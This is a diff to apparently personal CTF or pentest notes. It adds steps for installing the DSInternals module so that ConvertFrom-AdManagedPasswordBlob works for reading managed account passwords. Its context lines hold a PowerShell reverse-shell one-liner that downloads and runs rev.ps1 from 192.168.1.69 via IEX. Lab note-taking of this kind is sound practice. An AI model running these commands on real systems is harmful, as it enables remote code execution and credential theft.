@@ -23,3 +23,12 @@ Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
 # rev shell
 Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
 ```
+
+#### fix missing ConvertFrom-AdManagedPasswordBlob
+ConvertFrom-AdManagedPasswordBlob is not recognized as the name of a cmdlet, function...
+need to install DSInternals module
+```powershell
+Install-Module DSInternals -Force
+```
+if powershell gallery is not available on CTF boxes
+##### TODO: add steps to install from zip
